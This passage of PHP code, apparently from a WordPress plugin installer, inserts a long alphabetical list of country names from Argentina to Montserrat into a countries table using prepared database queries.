			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Argentina",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
		 	"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Armenia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Aruba",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Australia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Austria",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Azerbaijan",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Bahamas",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Bahrain",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Bangladesh",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Barbados",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Belarus",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Belgium",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Belize",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Benin",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Bermuda",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Bhutan",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Bolivia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Bosnia and Herzegovina",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Botswana",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Bouvet Island",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Brazil",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "British Indian Ocean territory",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Brunei Darussalam",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Bulgaria",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Burkina Faso",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Burundi",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Cambodia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Cameroon",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Canada",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Cape Verde",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Cayman Islands",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Central African Republic",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Chad",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Chile",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "China",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Christmas Island",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Cocos (Keeling) Islands",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Colombia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Comoros",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Congo",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Democratic Republic",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Cook Islands",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Costa Rica",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Côte d Ivoire (Ivory Coast)",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Croatia (Hrvatska)",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Cuba",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Cyprus",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Czech Republic",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Denmark",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Djibouti",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Dominica",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Dominican Republic",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "East Timor",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Ecuador",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Egypt",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "El Salvador",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Equatorial Guinea",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Eritrea",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Estonia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Ethiopia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Falkland Islands",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(     
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Faroe Islands",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Fiji",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Finland",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "France",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "French Guiana",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "French Polynesia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "French Southern Territories",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Gabon",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Gambia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Georgia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Germany",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Ghana",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Gibraltar",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Greece",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Greenland",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Grenada",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Guadeloupe",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Guam",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Guatemala",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Guinea",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Guinea-Bissau",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Guyana",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Haiti",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Heard and McDonald Islands",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Honduras",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Hong Kong",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Hungary",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Iceland",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "India",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Indonesia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Iran",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Iraq",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Ireland",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Israel",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Italy",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Jamaica",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Japan",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Jordan",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Kazakhstan",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Kenya",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Kiribati",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Korea (north)",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Korea (south)",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Kuwait",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Kyrgyzstan",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Lao Peoples Democratic Republic",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Latvia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Lebanon",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Lesotho",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Liberia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Libyan Arab Jamahiriya",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Liechtenstein",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Lithuania",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Luxembourg",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Macao",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Macedonia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Madagascar",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Malawi",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Malaysia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Maldives",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Mali",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Malta",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Marshall Islands",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Martinique",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Mauritania",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Mauritius",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Mayotte",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Mexico",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Micronesia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Moldova",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Monaco",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Mongolia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Montserrat",
		    "0",
